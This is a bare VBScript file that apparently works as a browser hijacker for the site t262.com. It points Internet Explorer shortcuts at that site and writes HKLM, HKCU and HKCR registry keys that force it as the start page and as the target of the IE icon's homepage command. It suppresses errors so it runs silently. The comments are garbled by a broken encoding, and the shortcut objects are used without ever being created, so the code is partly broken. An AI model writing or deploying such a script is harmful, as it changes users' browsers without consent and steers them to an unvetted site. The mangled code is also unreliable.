On Error Resume Next
Set objShell = WScript.CreateObject("WScript.Shell")
strDesktop = objShell.SpecialFolders.Item("Desktop")
'��ȡ����·�� 

strQuickLaunch = objShell.SpecialFolders.Item("AppData")   &   "\Microsoft\Internet Explorer\Quick Launch"

objqLink.TargetPath = "C:\Program Files\Internet Explorer\iexplore.exe"
objLink.TargetPath = "C:\Program Files\Internet Explorer\iexplore.exe"
objLink.Arguments = "http://www.t262.com/"
objqLink.Arguments = "http://www.t262.com/"
'�����������ַ
objLink.Save 
objqLink.Save

'����Ϊ��������

'==========����Ϊע���============

Dim OperationRegistry
Set OperationRegistry=WScript.CreateObject("WScript.Shell")
MyUrl="http://www.t262.com/"
'�����Ϊ�����ַ
RegPath="HKCR\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\SHELL\OPENHOMEPAGE\COMMAND\"
Type_Name="REG_SZ"
Key_Name=""
Key_Data="C:\Program Files\Internet Explorer\IEXPLORE.EXE http://www.t262.com/"
OperationRegistry.RegWrite  RegPath&Key_Name,Key_Data,Type_Name

RegPath="HKLM\SOFTWARE\Microsoft\Internet Explorer\main\Start Page"
yumen=OperationRegistry.RegWrite(RegPath,MyUrl)
RegPath="HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\Internet Explorer\Main\Start Page"
yumen=OperationRegistry.RegWrite(RegPath,MyUrl)
'OperationRegistry.RegWrite  RegPath&Key_Name,Key_Data,Type_Name
